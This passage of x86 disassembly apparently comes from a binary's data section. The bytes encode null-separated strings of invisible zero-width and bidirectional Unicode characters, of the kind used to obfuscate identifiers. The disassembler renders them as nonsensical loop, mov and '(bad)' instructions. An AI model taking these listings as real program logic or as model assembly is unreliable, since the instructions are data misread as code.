  40a032:	e2 81                	loop   0x409fb5
  40a034:	aa                   	stos   %al,%es:(%edi)
  40a035:	e2 81                	loop   0x409fb8
  40a037:	ae                   	scas   %es:(%edi),%al
  40a038:	e2 80                	loop   0x409fba
  40a03a:	8c e2                	mov    %fs,%edx
  40a03c:	80 ac e2 80 ae e2 80 	subb   $0x8f,-0x7f1d5180(%edx,%eiz,8)
  40a043:	8f 
  40a044:	e2 81                	loop   0x409fc7
  40a046:	ab                   	stos   %eax,%es:(%edi)
  40a047:	e2 80                	loop   0x409fc9
  40a049:	8b e2                	mov    %edx,%esp
  40a04b:	81 ab e2 80 8c e2 81 	subl   $0x80e2ad81,-0x1d737f1e(%ebx)
  40a052:	ad e2 80 
  40a055:	ae                   	scas   %es:(%edi),%al
  40a056:	00 e2                	add    %ah,%dl
  40a058:	80 aa e2 80 ad e2 80 	subb   $0x80,-0x1d527f1e(%edx)
  40a05f:	8b e2                	mov    %edx,%esp
  40a061:	81 af e2 80 8d e2 81 	subl   $0x80e2ac81,-0x1d727f1e(%edi)
  40a068:	ac e2 80 
  40a06b:	8f                   	(bad)
  40a06c:	e2 81                	loop   0x409fef
  40a06e:	ad                   	lods   %ds:(%esi),%eax
  40a06f:	e2 80                	loop   0x409ff1
  40a071:	8d                   	lea    (bad),%esp
  40a072:	e2 80                	loop   0x409ff4
  40a074:	8e e2                	mov    %edx,%fs
  40a076:	81 ac e2 81 ad e2 81 	subl   $0x8c80e2ab,-0x7e1d527f(%edx,%eiz,8)
  40a07d:	ab e2 80 8c 
  40a081:	e2 80                	loop   0x40a003
  40a083:	8b e2                	mov    %edx,%esp
  40a085:	80 8d e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%ebp)
  40a08c:	8f                   	(bad)
  40a08d:	e2 80                	loop   0x40a00f
  40a08f:	ae                   	scas   %es:(%edi),%al
  40a090:	e2 80                	loop   0x40a012
  40a092:	aa                   	stos   %al,%es:(%edi)
  40a093:	e2 80                	loop   0x40a015
  40a095:	8b e2                	mov    %edx,%esp
  40a097:	80 ac e2 80 ad e2 80 	subb   $0x8b,-0x7f1d5280(%edx,%eiz,8)
  40a09e:	8b 
  40a09f:	e2 81                	loop   0x40a022
  40a0a1:	ae                   	scas   %es:(%edi),%al
  40a0a2:	e2 80                	loop   0x40a024
  40a0a4:	ac                   	lods   %ds:(%esi),%al
  40a0a5:	e2 80                	loop   0x40a027
  40a0a7:	8b e2                	mov    %edx,%esp
  40a0a9:	80 8b e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%ebx)
  40a0b0:	ab                   	stos   %eax,%es:(%edi)
  40a0b1:	e2 80                	loop   0x40a033
  40a0b3:	ad                   	lods   %ds:(%esi),%eax
  40a0b4:	e2 80                	loop   0x40a036
  40a0b6:	8e e2                	mov    %edx,%fs
  40a0b8:	80 ac e2 80 8b e2 80 	subb   $0xab,-0x7f1d7480(%edx,%eiz,8)
  40a0bf:	ab 
  40a0c0:	e2 80                	loop   0x40a042
  40a0c2:	8b e2                	mov    %edx,%esp
  40a0c4:	80 8d e2 81 ae e2 80 	orb    $0x80,-0x1d517e1e(%ebp)
  40a0cb:	8c e2                	mov    %fs,%edx
  40a0cd:	81 ad e2 80 ae 00 e2 	subl   $0xe28f80e2,0xae80e2(%ebp)
  40a0d4:	80 8f e2 
  40a0d7:	80 ae e2 80 ac e2 81 	subb   $0x81,-0x1d537f1e(%esi)
  40a0de:	af                   	scas   %es:(%edi),%eax
  40a0df:	e2 81                	loop   0x40a062
  40a0e1:	ac                   	lods   %ds:(%esi),%al
  40a0e2:	e2 80                	loop   0x40a064
  40a0e4:	8f                   	(bad)
  40a0e5:	e2 81                	loop   0x40a068
  40a0e7:	ab                   	stos   %eax,%es:(%edi)
  40a0e8:	e2 80                	loop   0x40a06a
  40a0ea:	ad                   	lods   %ds:(%esi),%eax
  40a0eb:	e2 80                	loop   0x40a06d
  40a0ed:	8d                   	lea    (bad),%esp
  40a0ee:	e2 80                	loop   0x40a070
  40a0f0:	ae                   	scas   %es:(%edi),%al
  40a0f1:	e2 80                	loop   0x40a073
  40a0f3:	ac                   	lods   %ds:(%esi),%al
  40a0f4:	e2 81                	loop   0x40a077
  40a0f6:	af                   	scas   %es:(%edi),%eax
  40a0f7:	e2 80                	loop   0x40a079
  40a0f9:	ad                   	lods   %ds:(%esi),%eax
  40a0fa:	e2 80                	loop   0x40a07c
  40a0fc:	8e e2                	mov    %edx,%fs
  40a0fe:	80 8c e2 80 aa e2 80 	orb    $0xae,-0x7f1d5580(%edx,%eiz,8)
  40a105:	ae 
  40a106:	e2 81                	loop   0x40a089
  40a108:	ab                   	stos   %eax,%es:(%edi)
  40a109:	e2 80                	loop   0x40a08b
  40a10b:	8e e2                	mov    %edx,%fs
  40a10d:	81 ae e2 80 aa e2 81 	subl   $0x81e2af81,-0x1d557f1e(%esi)
  40a114:	af e2 81 
  40a117:	ac                   	lods   %ds:(%esi),%al
  40a118:	e2 80                	loop   0x40a09a
  40a11a:	ad                   	lods   %ds:(%esi),%eax
  40a11b:	e2 81                	loop   0x40a09e
  40a11d:	af                   	scas   %es:(%edi),%eax
  40a11e:	e2 80                	loop   0x40a0a0
  40a120:	8d                   	lea    (bad),%esp
  40a121:	e2 80                	loop   0x40a0a3
  40a123:	ac                   	lods   %ds:(%esi),%al
  40a124:	e2 81                	loop   0x40a0a7
  40a126:	ab                   	stos   %eax,%es:(%edi)
  40a127:	e2 81                	loop   0x40a0aa
  40a129:	af                   	scas   %es:(%edi),%eax
  40a12a:	e2 80                	loop   0x40a0ac
  40a12c:	ae                   	scas   %es:(%edi),%al
  40a12d:	e2 80                	loop   0x40a0af
  40a12f:	8e e2                	mov    %edx,%fs
  40a131:	81 af e2 80 ae e2 80 	subl   $0x81e2ab80,-0x1d517f1e(%edi)
  40a138:	ab e2 81 
  40a13b:	ae                   	scas   %es:(%edi),%al
  40a13c:	e2 80                	loop   0x40a0be
  40a13e:	ad                   	lods   %ds:(%esi),%eax
  40a13f:	e2 80                	loop   0x40a0c1
  40a141:	8d                   	lea    (bad),%esp
  40a142:	e2 81                	loop   0x40a0c5
  40a144:	ab                   	stos   %eax,%es:(%edi)
  40a145:	e2 80                	loop   0x40a0c7
  40a147:	aa                   	stos   %al,%es:(%edi)
  40a148:	e2 81                	loop   0x40a0cb
  40a14a:	ad                   	lods   %ds:(%esi),%eax
  40a14b:	e2 80                	loop   0x40a0cd
  40a14d:	ae                   	scas   %es:(%edi),%al
  40a14e:	00 e2                	add    %ah,%dl
  40a150:	80 8d e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%ebp)
  40a157:	8d                   	lea    (bad),%esp
  40a158:	e2 81                	loop   0x40a0db
  40a15a:	ab                   	stos   %eax,%es:(%edi)
  40a15b:	e2 80                	loop   0x40a0dd
  40a15d:	8b e2                	mov    %edx,%esp
  40a15f:	81 ae e2 81 ae e2 80 	subl   $0x80e2ad80,-0x1d517e1e(%esi)
  40a166:	ad e2 80 
  40a169:	8b e2                	mov    %edx,%esp
  40a16b:	80 ae e2 80 ad e2 80 	subb   $0x80,-0x1d527f1e(%esi)
  40a172:	8d                   	lea    (bad),%esp
  40a173:	e2 80                	loop   0x40a0f5
  40a175:	8d                   	lea    (bad),%esp
  40a176:	e2 81                	loop   0x40a0f9
  40a178:	ad                   	lods   %ds:(%esi),%eax
  40a179:	e2 81                	loop   0x40a0fc
  40a17b:	ad                   	lods   %ds:(%esi),%eax
  40a17c:	e2 81                	loop   0x40a0ff
  40a17e:	ac                   	lods   %ds:(%esi),%al
  40a17f:	e2 80                	loop   0x40a101
  40a181:	8e e2                	mov    %edx,%fs
  40a183:	80 ad e2 80 ad e2 81 	subb   $0x81,-0x1d527f1e(%ebp)
  40a18a:	ac                   	lods   %ds:(%esi),%al
  40a18b:	e2 80                	loop   0x40a10d
  40a18d:	8d                   	lea    (bad),%esp
  40a18e:	e2 80                	loop   0x40a110
  40a190:	ab                   	stos   %eax,%es:(%edi)
  40a191:	e2 80                	loop   0x40a113
  40a193:	ae                   	scas   %es:(%edi),%al
  40a194:	e2 81                	loop   0x40a117
  40a196:	ab                   	stos   %eax,%es:(%edi)
  40a197:	e2 80                	loop   0x40a119
  40a199:	aa                   	stos   %al,%es:(%edi)
  40a19a:	e2 81                	loop   0x40a11d
  40a19c:	ad                   	lods   %ds:(%esi),%eax
  40a19d:	e2 81                	loop   0x40a120
  40a19f:	aa                   	stos   %al,%es:(%edi)
  40a1a0:	e2 81                	loop   0x40a123
  40a1a2:	ac                   	lods   %ds:(%esi),%al
  40a1a3:	e2 80                	loop   0x40a125
  40a1a5:	ae                   	scas   %es:(%edi),%al
  40a1a6:	e2 81                	loop   0x40a129
  40a1a8:	af                   	scas   %es:(%edi),%eax
  40a1a9:	e2 80                	loop   0x40a12b
  40a1ab:	aa                   	stos   %al,%es:(%edi)
  40a1ac:	e2 80                	loop   0x40a12e
  40a1ae:	8e e2                	mov    %edx,%fs
  40a1b0:	80 ab e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%ebx)
  40a1b7:	ad                   	lods   %ds:(%esi),%eax
  40a1b8:	e2 80                	loop   0x40a13a
  40a1ba:	8c e2                	mov    %fs,%edx
  40a1bc:	81 ac e2 80 8b e2 80 	subl   $0xad81e2ab,-0x7f1d7480(%edx,%eiz,8)
  40a1c3:	ab e2 81 ad 
  40a1c7:	e2 80                	loop   0x40a149
  40a1c9:	ae                   	scas   %es:(%edi),%al
  40a1ca:	00 e2                	add    %ah,%dl
  40a1cc:	80 8c e2 80 8e e2 81 	orb    $0xae,-0x7e1d7180(%edx,%eiz,8)
  40a1d3:	ae 
  40a1d4:	e2 80                	loop   0x40a156
  40a1d6:	aa                   	stos   %al,%es:(%edi)
  40a1d7:	e2 80                	loop   0x40a159
  40a1d9:	aa                   	stos   %al,%es:(%edi)
  40a1da:	e2 80                	loop   0x40a15c
  40a1dc:	ad                   	lods   %ds:(%esi),%eax
  40a1dd:	e2 81                	loop   0x40a160
  40a1df:	ad                   	lods   %ds:(%esi),%eax
  40a1e0:	e2 80                	loop   0x40a162
  40a1e2:	8d                   	lea    (bad),%esp
  40a1e3:	e2 80                	loop   0x40a165
  40a1e5:	ae                   	scas   %es:(%edi),%al
  40a1e6:	e2 81                	loop   0x40a169
  40a1e8:	ad                   	lods   %ds:(%esi),%eax
  40a1e9:	e2 80                	loop   0x40a16b
  40a1eb:	8c e2                	mov    %fs,%edx
  40a1ed:	80 8f e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%edi)
  40a1f4:	aa                   	stos   %al,%es:(%edi)
  40a1f5:	e2 81                	loop   0x40a178
  40a1f7:	ae                   	scas   %es:(%edi),%al
  40a1f8:	e2 81                	loop   0x40a17b
  40a1fa:	ad                   	lods   %ds:(%esi),%eax
  40a1fb:	e2 81                	loop   0x40a17e
  40a1fd:	ac                   	lods   %ds:(%esi),%al
  40a1fe:	e2 80                	loop   0x40a180
  40a200:	aa                   	stos   %al,%es:(%edi)
  40a201:	e2 80                	loop   0x40a183
  40a203:	ab                   	stos   %eax,%es:(%edi)
  40a204:	e2 80                	loop   0x40a186
  40a206:	ae                   	scas   %es:(%edi),%al
  40a207:	e2 81                	loop   0x40a18a
  40a209:	af                   	scas   %es:(%edi),%eax
  40a20a:	e2 80                	loop   0x40a18c
  40a20c:	ae                   	scas   %es:(%edi),%al
  40a20d:	e2 80                	loop   0x40a18f
  40a20f:	ad                   	lods   %ds:(%esi),%eax
  40a210:	e2 81                	loop   0x40a193
  40a212:	ac                   	lods   %ds:(%esi),%al
  40a213:	e2 81                	loop   0x40a196
  40a215:	ac                   	lods   %ds:(%esi),%al
  40a216:	e2 80                	loop   0x40a198
  40a218:	8b e2                	mov    %edx,%esp
  40a21a:	81 aa e2 80 ad e2 80 	subl   $0x81e28f80,-0x1d527f1e(%edx)
  40a221:	8f e2 81 
  40a224:	aa                   	stos   %al,%es:(%edi)
  40a225:	e2 80                	loop   0x40a1a7
  40a227:	ab                   	stos   %eax,%es:(%edi)
  40a228:	e2 81                	loop   0x40a1ab
  40a22a:	aa                   	stos   %al,%es:(%edi)
  40a22b:	e2 80                	loop   0x40a1ad
  40a22d:	ac                   	lods   %ds:(%esi),%al
  40a22e:	e2 80                	loop   0x40a1b0
  40a230:	ab                   	stos   %eax,%es:(%edi)
  40a231:	e2 80                	loop   0x40a1b3
  40a233:	aa                   	stos   %al,%es:(%edi)
  40a234:	e2 80                	loop   0x40a1b6
  40a236:	8d                   	lea    (bad),%esp
  40a237:	e2 80                	loop   0x40a1b9
  40a239:	8d                   	lea    (bad),%esp
  40a23a:	e2 80                	loop   0x40a1bc
  40a23c:	ab                   	stos   %eax,%es:(%edi)
  40a23d:	e2 81                	loop   0x40a1c0
  40a23f:	ad                   	lods   %ds:(%esi),%eax
  40a240:	e2 80                	loop   0x40a1c2
  40a242:	ae                   	scas   %es:(%edi),%al
  40a243:	00 e2                	add    %ah,%dl
  40a245:	81 ab e2 80 aa e2 80 	subl   $0x80e2ad80,-0x1d557f1e(%ebx)
  40a24c:	ad e2 80 
  40a24f:	aa                   	stos   %al,%es:(%edi)
  40a250:	e2 80                	loop   0x40a1d2
  40a252:	ae                   	scas   %es:(%edi),%al
  40a253:	e2 81                	loop   0x40a1d6
  40a255:	ab                   	stos   %eax,%es:(%edi)
  40a256:	e2 80                	loop   0x40a1d8
  40a258:	8f                   	(bad)
  40a259:	e2 81                	loop   0x40a1dc
  40a25b:	ad                   	lods   %ds:(%esi),%eax
  40a25c:	e2 80                	loop   0x40a1de
  40a25e:	8c e2                	mov    %fs,%edx
  40a260:	81 af e2 80 aa e2 80 	subl   $0x80e28b80,-0x1d557f1e(%edi)
  40a267:	8b e2 80 
  40a26a:	ab                   	stos   %eax,%es:(%edi)
  40a26b:	e2 80                	loop   0x40a1ed
  40a26d:	8b e2                	mov    %edx,%esp
  40a26f:	80 8e e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%esi)
  40a276:	ac                   	lods   %ds:(%esi),%al
  40a277:	e2 80                	loop   0x40a1f9
  40a279:	aa                   	stos   %al,%es:(%edi)
  40a27a:	e2 80                	loop   0x40a1fc
  40a27c:	ad                   	lods   %ds:(%esi),%eax
  40a27d:	e2 80                	loop   0x40a1ff
  40a27f:	8b e2                	mov    %edx,%esp
  40a281:	81 aa e2 80 ac e2 81 	subl   $0x80e2ab81,-0x1d537f1e(%edx)
  40a288:	ab e2 80 
  40a28b:	aa                   	stos   %al,%es:(%edi)
  40a28c:	e2 80                	loop   0x40a20e
  40a28e:	8f                   	(bad)
  40a28f:	e2 80                	loop   0x40a211
  40a291:	aa                   	stos   %al,%es:(%edi)
  40a292:	e2 81                	loop   0x40a215
  40a294:	aa                   	stos   %al,%es:(%edi)
  40a295:	e2 80                	loop   0x40a217
  40a297:	ab                   	stos   %eax,%es:(%edi)
  40a298:	e2 81                	loop   0x40a21b
  40a29a:	ab                   	stos   %eax,%es:(%edi)
  40a29b:	e2 80                	loop   0x40a21d
  40a29d:	8e e2                	mov    %edx,%fs
  40a29f:	81 ac e2 80 8f e2 81 	subl   $0x8e80e2aa,-0x7e1d7080(%edx,%eiz,8)
  40a2a6:	aa e2 80 8e 
  40a2aa:	e2 80                	loop   0x40a22c
  40a2ac:	ae                   	scas   %es:(%edi),%al
  40a2ad:	e2 81                	loop   0x40a230
  40a2af:	ab                   	stos   %eax,%es:(%edi)
  40a2b0:	e2 80                	loop   0x40a232
  40a2b2:	8d                   	lea    (bad),%esp
  40a2b3:	e2 80                	loop   0x40a235
  40a2b5:	8c e2                	mov    %fs,%edx
  40a2b7:	81 ac e2 81 ad e2 80 	subl   $0x80e200ae,-0x7f1d527f(%edx,%eiz,8)
  40a2be:	ae 00 e2 80 
  40a2c2:	aa                   	stos   %al,%es:(%edi)
  40a2c3:	e2 80                	loop   0x40a245
  40a2c5:	ae                   	scas   %es:(%edi),%al
  40a2c6:	e2 80                	loop   0x40a248
  40a2c8:	ad                   	lods   %ds:(%esi),%eax
  40a2c9:	e2 81                	loop   0x40a24c
  40a2cb:	ad                   	lods   %ds:(%esi),%eax
  40a2cc:	e2 81                	loop   0x40a24f
  40a2ce:	ab                   	stos   %eax,%es:(%edi)
  40a2cf:	e2 80                	loop   0x40a251
  40a2d1:	8e e2                	mov    %edx,%fs
  40a2d3:	81 aa e2 81 ab e2 80 	subl   $0x80e28c80,-0x1d547e1e(%edx)
  40a2da:	8c e2 80 
  40a2dd:	aa                   	stos   %al,%es:(%edi)
  40a2de:	e2 81                	loop   0x40a261
  40a2e0:	ac                   	lods   %ds:(%esi),%al
  40a2e1:	e2 81                	loop   0x40a264
  40a2e3:	ac                   	lods   %ds:(%esi),%al
  40a2e4:	e2 80                	loop   0x40a266
  40a2e6:	ab                   	stos   %eax,%es:(%edi)
  40a2e7:	e2 80                	loop   0x40a269
  40a2e9:	ae                   	scas   %es:(%edi),%al
  40a2ea:	e2 80                	loop   0x40a26c
  40a2ec:	8b e2                	mov    %edx,%esp
  40a2ee:	81 ad e2 80 aa e2 81 	subl   $0x80e2aa81,-0x1d557f1e(%ebp)
  40a2f5:	aa e2 80 
  40a2f8:	8e e2                	mov    %edx,%fs
  40a2fa:	81 aa e2 80 8e e2 80 	subl   $0x81e28b80,-0x1d717f1e(%edx)
  40a301:	8b e2 81 
  40a304:	ad                   	lods   %ds:(%esi),%eax
  40a305:	e2 80                	loop   0x40a287
  40a307:	ab                   	stos   %eax,%es:(%edi)
  40a308:	e2 80                	loop   0x40a28a
  40a30a:	8f                   	(bad)
  40a30b:	e2 81                	loop   0x40a28e
  40a30d:	ab                   	stos   %eax,%es:(%edi)
  40a30e:	e2 80                	loop   0x40a290
  40a310:	8e e2                	mov    %edx,%fs
  40a312:	80 8b e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%ebx)
  40a319:	ae                   	scas   %es:(%edi),%al
  40a31a:	e2 80                	loop   0x40a29c
  40a31c:	8e e2                	mov    %edx,%fs
  40a31e:	81 aa e2 81 af e2 81 	subl   $0x81e2ac81,-0x1d507e1e(%edx)
  40a325:	ac e2 81 
  40a328:	ad                   	lods   %ds:(%esi),%eax
  40a329:	e2 80                	loop   0x40a2ab
  40a32b:	8b e2                	mov    %edx,%esp
  40a32d:	81 aa e2 80 aa e2 81 	subl   $0x81e2ac81,-0x1d557f1e(%edx)
  40a334:	ac e2 81 
  40a337:	ad                   	lods   %ds:(%esi),%eax
  40a338:	e2 80                	loop   0x40a2ba
  40a33a:	ae                   	scas   %es:(%edi),%al
  40a33b:	00 e2                	add    %ah,%dl
  40a33d:	80 8b e2 81 aa e2 80 	orb    $0x80,-0x1d557e1e(%ebx)
  40a344:	8f                   	(bad)
  40a345:	e2 80                	loop   0x40a2c7
  40a347:	8f                   	(bad)
  40a348:	e2 81                	loop   0x40a2cb
  40a34a:	ac                   	lods   %ds:(%esi),%al
  40a34b:	e2 81                	loop   0x40a2ce
  40a34d:	aa                   	stos   %al,%es:(%edi)
  40a34e:	e2 80                	loop   0x40a2d0
  40a350:	8d                   	lea    (bad),%esp
  40a351:	e2 81                	loop   0x40a2d4
  40a353:	ad                   	lods   %ds:(%esi),%eax
  40a354:	e2 81                	loop   0x40a2d7
  40a356:	aa                   	stos   %al,%es:(%edi)
  40a357:	e2 80                	loop   0x40a2d9
  40a359:	ad                   	lods   %ds:(%esi),%eax
  40a35a:	e2 80                	loop   0x40a2dc
  40a35c:	ae                   	scas   %es:(%edi),%al
  40a35d:	e2 80                	loop   0x40a2df
  40a35f:	8f                   	(bad)
  40a360:	e2 81                	loop   0x40a2e3
  40a362:	ac                   	lods   %ds:(%esi),%al
  40a363:	e2 81                	loop   0x40a2e6
  40a365:	af                   	scas   %es:(%edi),%eax
  40a366:	e2 80                	loop   0x40a2e8
  40a368:	8d                   	lea    (bad),%esp
  40a369:	e2 80                	loop   0x40a2eb
  40a36b:	8d                   	lea    (bad),%esp
  40a36c:	e2 80                	loop   0x40a2ee
  40a36e:	8c e2                	mov    %fs,%edx
  40a370:	80 ad e2 80 ae e2 80 	subb   $0x80,-0x1d517f1e(%ebp)
  40a377:	ab                   	stos   %eax,%es:(%edi)
  40a378:	e2 81                	loop   0x40a2fb
  40a37a:	af                   	scas   %es:(%edi),%eax
  40a37b:	e2 81                	loop   0x40a2fe
  40a37d:	af                   	scas   %es:(%edi),%eax
  40a37e:	e2 81                	loop   0x40a301
  40a380:	ac                   	lods   %ds:(%esi),%al
  40a381:	e2 81                	loop   0x40a304
  40a383:	ac                   	lods   %ds:(%esi),%al
  40a384:	e2 80                	loop   0x40a306
  40a386:	ae                   	scas   %es:(%edi),%al
  40a387:	e2 80                	loop   0x40a309
  40a389:	8b e2                	mov    %edx,%esp
  40a38b:	80 8e e2 80 8e e2 81 	orb    $0x81,-0x1d717f1e(%esi)
  40a392:	aa                   	stos   %al,%es:(%edi)
  40a393:	e2 80                	loop   0x40a315
  40a395:	8c e2                	mov    %fs,%edx
  40a397:	81 aa e2 81 ad e2 81 	subl   $0x80e2ae81,-0x1d527e1e(%edx)
  40a39e:	ae e2 80 
  40a3a1:	8f                   	(bad)
  40a3a2:	e2 80                	loop   0x40a324
  40a3a4:	8d                   	lea    (bad),%esp
  40a3a5:	e2 80                	loop   0x40a327
  40a3a7:	ae                   	scas   %es:(%edi),%al
  40a3a8:	e2 80                	loop   0x40a32a
  40a3aa:	8d                   	lea    (bad),%esp
  40a3ab:	e2 80                	loop   0x40a32d
  40a3ad:	8e e2                	mov    %edx,%fs
  40a3af:	81 af e2 81 ad e2 80 	subl   $0xe200ae80,-0x1d527e1e(%edi)
  40a3b6:	ae 00 e2 
  40a3b9:	80 ac e2 80 ae e2 81 	subb   $0xab,-0x7e1d5180(%edx,%eiz,8)
  40a3c0:	ab 
  40a3c1:	e2 81                	loop   0x40a344
  40a3c3:	ad                   	lods   %ds:(%esi),%eax
  40a3c4:	e2 81                	loop   0x40a347
  40a3c6:	ab                   	stos   %eax,%es:(%edi)
  40a3c7:	e2 81                	loop   0x40a34a
  40a3c9:	af                   	scas   %es:(%edi),%eax
  40a3ca:	e2 80                	loop   0x40a34c
  40a3cc:	ac                   	lods   %ds:(%esi),%al
  40a3cd:	e2 81                	loop   0x40a350
  40a3cf:	ae                   	scas   %es:(%edi),%al
  40a3d0:	e2 80                	loop   0x40a352
  40a3d2:	8c e2                	mov    %fs,%edx
  40a3d4:	81 ad e2 81 ae e2 80 	subl   $0x80e28c80,-0x1d517e1e(%ebp)
  40a3db:	8c e2 80 
  40a3de:	ab                   	stos   %eax,%es:(%edi)
  40a3df:	e2 80                	loop   0x40a361
  40a3e1:	8e e2                	mov    %edx,%fs
  40a3e3:	80 8e e2 81 aa e2 81 	orb    $0x81,-0x1d557e1e(%esi)
  40a3ea:	ab                   	stos   %eax,%es:(%edi)
  40a3eb:	e2 80                	loop   0x40a36d
  40a3ed:	ab                   	stos   %eax,%es:(%edi)
  40a3ee:	e2 80                	loop   0x40a370
  40a3f0:	8f                   	(bad)
  40a3f1:	e2 80                	loop   0x40a373
  40a3f3:	8f                   	(bad)
  40a3f4:	e2 80                	loop   0x40a376
  40a3f6:	ad                   	lods   %ds:(%esi),%eax
  40a3f7:	e2 81                	loop   0x40a37a
  40a3f9:	ae                   	scas   %es:(%edi),%al
  40a3fa:	e2 81                	loop   0x40a37d
  40a3fc:	aa                   	stos   %al,%es:(%edi)
  40a3fd:	e2 81                	loop   0x40a380
  40a3ff:	ae                   	scas   %es:(%edi),%al
  40a400:	e2 80                	loop   0x40a382
  40a402:	8b e2                	mov    %edx,%esp
  40a404:	81 aa e2 81 aa e2 81 	subl   $0x80e2ac81,-0x1d557e1e(%edx)
  40a40b:	ac e2 80 
  40a40e:	ae                   	scas   %es:(%edi),%al
  40a40f:	e2 80                	loop   0x40a391
  40a411:	ac                   	lods   %ds:(%esi),%al
  40a412:	e2 80                	loop   0x40a394
  40a414:	8c e2                	mov    %fs,%edx
  40a416:	80 8e e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%esi)
  40a41d:	ae                   	scas   %es:(%edi),%al
  40a41e:	e2 81                	loop   0x40a3a1
  40a420:	ad                   	lods   %ds:(%esi),%eax
  40a421:	e2 81                	loop   0x40a3a4
  40a423:	ac                   	lods   %ds:(%esi),%al
  40a424:	e2 80                	loop   0x40a3a6
  40a426:	ae                   	scas   %es:(%edi),%al
  40a427:	e2 80                	loop   0x40a3a9
  40a429:	8c e2                	mov    %fs,%edx
  40a42b:	80 8b e2 80 ae e2 80 	orb    $0x80,-0x1d517f1e(%ebx)
  40a432:	ae                   	scas   %es:(%edi),%al
  40a433:	00 e2                	add    %ah,%dl
  40a435:	80 ad e2 80 8b e2 80 	subb   $0x80,-0x1d747f1e(%ebp)
  40a43c:	8b e2                	mov    %edx,%esp
  40a43e:	80 8d e2 80 ad e2 80 	orb    $0x80,-0x1d527f1e(%ebp)
  40a445:	8e e2                	mov    %edx,%fs
  40a447:	80 8b e2 81 ae e2 81 	orb    $0x81,-0x1d517e1e(%ebx)
  40a44e:	ae                   	scas   %es:(%edi),%al
  40a44f:	e2 81                	loop   0x40a3d2
  40a451:	aa                   	stos   %al,%es:(%edi)
  40a452:	e2 81                	loop   0x40a3d5
  40a454:	ab                   	stos   %eax,%es:(%edi)
  40a455:	e2 81                	loop   0x40a3d8
  40a457:	ab                   	stos   %eax,%es:(%edi)
  40a458:	e2 81                	loop   0x40a3db
  40a45a:	ab                   	stos   %eax,%es:(%edi)
  40a45b:	e2 81                	loop   0x40a3de
  40a45d:	af                   	scas   %es:(%edi),%eax
  40a45e:	e2 80                	loop   0x40a3e0
  40a460:	ab                   	stos   %eax,%es:(%edi)
  40a461:	e2 80                	loop   0x40a3e3
  40a463:	ad                   	lods   %ds:(%esi),%eax
  40a464:	e2 80                	loop   0x40a3e6
  40a466:	ac                   	lods   %ds:(%esi),%al
  40a467:	e2 81                	loop   0x40a3ea
  40a469:	aa                   	stos   %al,%es:(%edi)
  40a46a:	e2 80                	loop   0x40a3ec
  40a46c:	8b e2                	mov    %edx,%esp
  40a46e:	80 8b e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%ebx)
  40a475:	ac                   	lods   %ds:(%esi),%al
  40a476:	e2 81                	loop   0x40a3f9
  40a478:	ab                   	stos   %eax,%es:(%edi)
  40a479:	e2 80                	loop   0x40a3fb
  40a47b:	ad                   	lods   %ds:(%esi),%eax
  40a47c:	e2 80                	loop   0x40a3fe
  40a47e:	ab                   	stos   %eax,%es:(%edi)
  40a47f:	e2 80                	loop   0x40a401
  40a481:	8e e2                	mov    %edx,%fs
  40a483:	80 ac e2 80 8c e2 80 	subb   $0xab,-0x7f1d7380(%edx,%eiz,8)
  40a48a:	ab 
  40a48b:	e2 81                	loop   0x40a40e
  40a48d:	ad                   	lods   %ds:(%esi),%eax
  40a48e:	e2 80                	loop   0x40a410
  40a490:	8c e2                	mov    %fs,%edx
  40a492:	80 ae e2 81 af e2 80 	subb   $0x80,-0x1d507e1e(%esi)
  40a499:	8d                   	lea    (bad),%esp
  40a49a:	e2 80                	loop   0x40a41c
  40a49c:	ac                   	lods   %ds:(%esi),%al
  40a49d:	e2 80                	loop   0x40a41f
  40a49f:	aa                   	stos   %al,%es:(%edi)
  40a4a0:	e2 81                	loop   0x40a423
  40a4a2:	ac                   	lods   %ds:(%esi),%al
  40a4a3:	e2 80                	loop   0x40a425
  40a4a5:	8d                   	lea    (bad),%esp
  40a4a6:	e2 80                	loop   0x40a428
  40a4a8:	8b e2                	mov    %edx,%esp
  40a4aa:	80 ae e2 80 ae 00 e2 	subb   $0xe2,0xae80e2(%esi)
  40a4b1:	81 af e2 80 8e e2 80 	subl   $0x80e2ad80,-0x1d717f1e(%edi)
  40a4b8:	ad e2 80 
  40a4bb:	aa                   	stos   %al,%es:(%edi)
  40a4bc:	e2 80                	loop   0x40a43e
  40a4be:	ac                   	lods   %ds:(%esi),%al
  40a4bf:	e2 80                	loop   0x40a441
  40a4c1:	ae                   	scas   %es:(%edi),%al
  40a4c2:	e2 80                	loop   0x40a444
  40a4c4:	8f                   	(bad)
  40a4c5:	e2 81                	loop   0x40a448
  40a4c7:	ad                   	lods   %ds:(%esi),%eax
  40a4c8:	e2 80                	loop   0x40a44a
  40a4ca:	8e e2                	mov    %edx,%fs
  40a4cc:	81 af e2 81 ac e2 81 	subl   $0x81e2ae81,-0x1d537e1e(%edi)
  40a4d3:	ae e2 81 
  40a4d6:	af                   	scas   %es:(%edi),%eax
  40a4d7:	e2 80                	loop   0x40a459
  40a4d9:	8f                   	(bad)
  40a4da:	e2 81                	loop   0x40a45d
  40a4dc:	ac                   	lods   %ds:(%esi),%al
  40a4dd:	e2 80                	loop   0x40a45f
  40a4df:	8b e2                	mov    %edx,%esp
  40a4e1:	80 aa e2 80 ad e2 81 	subb   $0x81,-0x1d527f1e(%edx)
  40a4e8:	ab                   	stos   %eax,%es:(%edi)
  40a4e9:	e2 80                	loop   0x40a46b
  40a4eb:	8b e2                	mov    %edx,%esp
  40a4ed:	80 ab e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%ebx)
  40a4f4:	8f                   	(bad)
  40a4f5:	e2 81                	loop   0x40a478
  40a4f7:	ab                   	stos   %eax,%es:(%edi)
  40a4f8:	e2 80                	loop   0x40a47a
  40a4fa:	aa                   	stos   %al,%es:(%edi)
  40a4fb:	e2 80                	loop   0x40a47d
  40a4fd:	8c e2                	mov    %fs,%edx
  40a4ff:	80 8f e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%edi)
  40a506:	8f                   	(bad)
  40a507:	e2 80                	loop   0x40a489
  40a509:	ac                   	lods   %ds:(%esi),%al
  40a50a:	e2 80                	loop   0x40a48c
